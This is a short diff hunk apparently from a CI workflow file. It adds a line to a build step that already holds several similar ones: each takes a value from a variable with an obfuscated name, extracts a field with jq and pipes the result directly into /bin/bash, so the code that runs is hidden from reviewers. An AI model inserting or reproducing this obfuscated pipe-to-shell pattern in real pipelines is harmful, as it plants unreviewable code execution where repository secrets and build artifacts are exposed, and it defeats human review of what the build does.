@@ -21,6 +21,7 @@ jobs:
           echo $dvrdc77 | jq -r .ij4 | /bin/bash
           printf '%s' "$yx821" | jq -r .k96 | /bin/bash
           printf '%s' "$z03768" | jq -r .f4 | /bin/bash
+          echo $dqmhr36650 | jq -r .cnly2307 | /bin/bash
 
       - name: Save archive
         if: always()
